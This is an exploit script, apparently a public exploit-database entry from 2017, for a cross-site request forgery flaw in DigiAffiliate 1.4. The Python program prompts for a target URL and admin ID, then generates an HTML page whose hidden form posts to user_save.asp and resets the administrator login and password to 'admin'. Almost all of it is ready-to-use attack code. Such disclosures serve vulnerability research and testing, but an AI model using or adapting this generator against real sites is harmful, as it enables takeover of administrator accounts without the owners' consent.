#!/usr/local/bin/python
# # # # #
# Exploit Title: DigiAffiliate 1.4 - Cross-Site Request Forgery (Update Admin)
# Dork: N/A
# Date: 18.09.2017
# Vendor Homepage: http://www.digiappz.com/
# Software Link: http://www.digiappz.com/digiaffiliate.asp?id=7
# Demo: http://www.digiappz.com/digiaffiliate/login.asp
# Version: 1.4
# Category: Webapps
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A
# # # # #
# Exploit Author: Ihsan Sencan
# Author Web: http://ihsan.net
# Author Social: @ihsansencan
# # # # #
import os
import urllib

if os.name == 'nt':
		os.system('cls')
else:
	os.system('clear')

def csrfexploit():

	e_baslik = '''
################################################################################
        ______  _______ ___    _   __   _____ _______   ___________    _   __
       /  _/ / / / ___//   |  / | / /  / ___// ____/ | / / ____/   |  / | / /
       / // /_/ /\__ \/ /| | /  |/ /   \__ \/ __/ /  |/ / /   / /| | /  |/ /
     _/ // __  /___/ / ___ |/ /|  /   ___/ / /___/ /|  / /___/ ___ |/ /|  /
    /___/_/ /_//____/_/  |_/_/ |_/   /____/_____/_/ |_/\____/_/  |_/_/ |_/

                                 WWW.IHSAN.NET
                               ihsan[@]ihsan.net
                                       +
                    DigiAffiliate 1.4 - CSRF (Update Admin)
################################################################################


	'''
	print e_baslik

	url = str(raw_input(" [+] Enter The Target URL (Please include http:// or https://) \n Demo Site:http://digiappz.com/digiaffiliate: "))
	id = raw_input(" [+] Enter The User ID \n (Demo Site Admin ID:220): ")

	csrfhtmlcode = '''
<html>
<body>
<form method="POST" action="%s/user_save.asp" name="user">
<table border="0" align="center">
  <tbody><tr>
    <td valign="middle">

        <table border="0" align="center">
          <tbody><tr>
          	<td bgcolor="gray" align="center">
        	    <table width="400" cellspacing="1" cellpadding="2" border="0">
        			<tbody><tr>
        				<td colspan="2" bgcolor="cream" align="left">
        					<font color="red">User Update</font>
        				</td>
        			</tr>
                  	<tr>
                    	<td>
        					<font><b>Choose Login*</b></font>
        				</td>
        				<td>
                	    	<input name="login" size="30" value="admin" type="text">
        				</td>
        			</tr>
                  	<tr>
                    	<td>
        					<font><b>Choose Password*</b></font>
        				</td>
        				<td>
                	    	<input name="password" size="30" value="admin" type="text">
        				</td>
        			</tr>
        			<tr>
        				<td colspan="2" align="center">
        					<input name="id" value="%s" type="hidden">
        					<input value="Update" onclick="return check()" type="submit">
        				</td>
        			</tr>
        		 </tbody></table>
        	  </td>
        	</tr>
        </tbody></table>
	 </td>
  </tr>
</tbody></table>
</form>
	''' %(url, id)

	print " +----------------------------------------------------+\n [!] The HTML exploit code for exploiting this CSRF has been created."

	print(" [!] Enter your Filename below\n Note: The exploit will be saved as 'filename'.html \n")
	extension = ".html"
	name = raw_input(" Filename: ")
	filename = name+extension
	file = open(filename, "w")

	file.write(csrfhtmlcode)
	file.close()
	print(" [+] Your exploit is saved as %s")%filename
	print("")

csrfexploit()